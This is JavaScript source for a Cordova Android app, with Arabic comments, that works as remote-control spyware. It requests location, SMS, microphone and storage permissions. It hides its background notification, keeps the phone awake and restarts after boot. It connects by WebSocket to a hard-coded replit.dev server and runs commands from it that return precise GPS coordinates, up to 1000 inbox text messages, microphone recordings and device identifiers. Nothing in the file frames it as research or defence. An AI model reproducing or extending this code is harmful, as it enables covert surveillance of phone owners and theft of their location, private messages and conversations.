document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات الأساسية فور تشغيل التطبيق
  requestEssentialPermissions();
  
  // تحسين وضع الخلفية ليبقى التطبيق نشطًا دائمًا
  setupBackgroundMode();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// طلب الأذونات الأساسية فور تشغيل التطبيق
function requestEssentialPermissions() {
  if (cordova.platformId === 'android') {
    const permissions = cordova.plugins.permissions;
    
    const neededPermissions = [
      permissions.ACCESS_FINE_LOCATION,
      permissions.READ_SMS,
      permissions.RECORD_AUDIO,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    ];
    
    permissions.hasPermission(neededPermissions, function(status) {
      if (!status.hasPermission) {
        permissions.requestPermissions(neededPermissions, function(status) {
          if (!status.hasPermission) {
            console.warn('لم يتم منح الأذونات المطلوبة');
            // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
            requestBatteryOptimizationExemption();
          } else {
            console.log('تم منح جميع الأذونات المطلوبة');
          }
        }, function(error) {
          console.error('خطأ في طلب الأذونات:', error);
          // محاولة إلزامية للحصول على إذن تجاهل تحسينات البطارية
          requestBatteryOptimizationExemption();
        });
      }
    });
  }
}

// طلب إعفاء من تحسينات البطارية (مهم للبقاء في الخلفية)
function requestBatteryOptimizationExemption() {
  if (cordova.platformId === 'android' && cordova.plugins && cordova.plugins.BatterySaver) {
    cordova.plugins.BatterySaver.isIgnoringBatteryOptimizations(function(isIgnoring) {
      if (!isIgnoring) {
        cordova.plugins.BatterySaver.requestIgnoreBatteryOptimizations(function() {
          console.log('تم طلب إعفاء من تحسينات البطارية');
        }, function(error) {
          console.error('فشل طلب إعفاء من تحسينات البطارية:', error);
          // محاولة بديلة
          try {
            cordova.plugins.BatteryStatus.requestOptimizationsExemption();
          } catch (e) {
            console.error('فشل المحاولة البديلة:', e);
          }
        });
      }
    });
  }
}

// تحسين وضع الخلفية
function setupBackgroundMode() {
  if (cordova.plugins.backgroundMode) {
    // إعدادات أكثر فعالية ليبقى التطبيق نشطًا
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      color: 'F14F4D',
      icon: 'icon',
      resume: true,
      hidden: true,
      bigText: true,
      silent: true
    });
    
    cordova.plugins.backgroundMode.enable();
    
    // منع الجهاز من الدخول في وضع السكون
    if (cordova.plugins.insomnia) {
      cordova.plugins.insomnia.keepAwake();
    }
    
    // التعامل مع تفعيل الوضع الخلفي
    cordova.plugins.backgroundMode.on('activate', function() {
      // تعطيل تحسينات البطارية ليبقى التطبيق نشطًا
      if (cordova.plugins.backgroundMode.disableBatteryOptimizations) {
        cordova.plugins.backgroundMode.disableBatteryOptimizations();
      }
      
      // التأكد من إعادة الاتصال بالخادم
      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
        const deviceInfo = {
          uuid: device.uuid || 'unknown',
          model: device.model || 'Unknown',
          platform: device.platform || 'Unknown',
          version: device.version || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown'
        };
        connectToServer(deviceInfo);
      }
    });
    
    // التعامل مع الضغط على إشعار الوضع الخلفي
    cordova.plugins.backgroundMode.on('notificationclick', function() {
      cordova.plugins.backgroundMode.moveToForeground();
    });
  }
  
  // التأكد من استمرار التطبيق في الخلفية حتى بعد إغلاقه
  if (cordova.plugins.foregroundService) {
    cordova.plugins.foregroundService.start(
      'التطبيق يعمل في الخلفية',
      'جارٍ مراقبة الأوامر الواردة',
      'icon',
      function() {
        console.log('Foreground service started');
      },
      function(error) {
        console.error('Foreground service error:', error);
      }
    );
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  
  // التأكد من عدم وجود اتصال مكرر
  if (window.wsConnection) {
    try {
      window.wsConnection.close();
    } catch (e) {
      console.log('No existing connection to close');
    }
  }
  
  window.wsConnection = new WebSocket(wsUrl);
  
  window.wsConnection.onopen = () => {
    console.log('Connected to server');
    // تسجيل الجهاز
    window.wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
    
    // إرسال نبضات قلبية دورية
    startHeartbeat();
  };
  
  window.wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString(),
          commandId: data.commandId
        });
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, data.commandId, (response) => {
          if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
            window.wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  window.wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  window.wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // محاولة إعادة الاتصال بشكل أكثر ذكاءً
    reconnectWithExponentialBackoff(deviceInfo);
  };
}

// متغيرات لإدارة إعادة الاتصال
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let heartbeatInterval = null;

// دالة لإرسال نبضات القلب
function startHeartbeat() {
  // إيقاف أي نبضات قديمة
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
  }
  
  // إرسال نبضات قلبية كل 30 ثانية
  heartbeatInterval = setInterval(() => {
    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
      try {
        window.wsConnection.send(JSON.stringify({ 
          type: 'heartbeat',
          timestamp: new Date().toISOString(),
          receivedRequests // إرسال سجل الطلبات المستلمة
        }));
      } catch (e) {
        console.error('Error sending heartbeat:', e);
        clearInterval(heartbeatInterval);
        reconnectWithExponentialBackoff({
          uuid: device.uuid || 'unknown',
          model: device.model || 'Unknown',
          platform: device.platform || 'Unknown',
          version: device.version || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown'
        });
      }
    } else {
      clearInterval(heartbeatInterval);
      reconnectWithExponentialBackoff({
        uuid: device.uuid || 'unknown',
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown'
      });
    }
  }, 30000);
}

// دالة لإعادة الاتصال مع زيادة المهلة تدريجياً
function reconnectWithExponentialBackoff(deviceInfo) {
  reconnectAttempts++;
  
  // حساب المهلة مع زيادة تدريجية (2^reconnectAttempts * 1000)
  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 300000); // الحد الأقصى 5 دقائق
  
  console.log(`محاولة إعادة الاتصال ${reconnectAttempts} بعد ${delay}ms`);
  
  setTimeout(() => {
    if (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
      connectToServer(deviceInfo);
    } else {
      console.log('تم بلوغ الحد الأقصى لمحاولات إعادة الاتصال');
      // إعادة تعيين المحاولات بعد فترة طويلة
      setTimeout(() => {
        reconnectAttempts = 0;
      }, 3600000); // 60 دقيقة
    }
  }, delay);
}

function executeCommand(command, commandId, callback) {
  console.log('Executing command:', command);
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 30000, // زيادة المهلة
    maximumAge: 0
  };
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  console.log('App resumed, checking connection...');
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    reconnectWithExponentialBackoff({
      uuid: device.uuid || 'unknown',
      model: device.model || 'Unknown',
      platform: device.platform || 'Unknown',
      version: device.version || 'Unknown',
      manufacturer: device.manufacturer || 'Unknown'
    });
  }
}, false);

// التعامل مع إعادة التشغيل التلقائي بعد تشغيل الجهاز
document.addEventListener('bootcomplete', () => {
  console.log('Device booted, starting app...');
  onDeviceReady();
}, false);

// إضافة حدث لبدء التطبيق عند التشغيل
document.addEventListener('deviceready', () => {
  // التأكد من تشغيل التطبيق في الخلفية بعد التشغيل
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
  
  // التأكد من تشغيل خدمة المقدمة
  if (cordova.plugins.foregroundService) {
    cordova.plugins.foregroundService.start(
      'التطبيق يعمل في الخلفية',
      'جارٍ مراقبة الأوامر الواردة',
      'icon',
      function() {
        console.log('Foreground service started after boot');
      },
      function(error) {
        console.error('Foreground service error after boot:', error);
      }
    );
  }
}, false);

// إضافة معالج للأخطاء الحرجة
window.onerror = function(message, source, lineno, colno, error) {
  console.error('Critical error:', message, error);
  // محاولة إعادة الاتصال في حالة حدوث خطأ حرج
  if (error && error.message && error.message.includes('WebSocket')) {
    reconnectWithExponentialBackoff({
      uuid: device.uuid || 'unknown',
      model: device.model || 'Unknown',
      platform: device.platform || 'Unknown',
      version: device.version || 'Unknown',
      manufacturer: device.manufacturer || 'Unknown'
    });
  }
  return false;
};
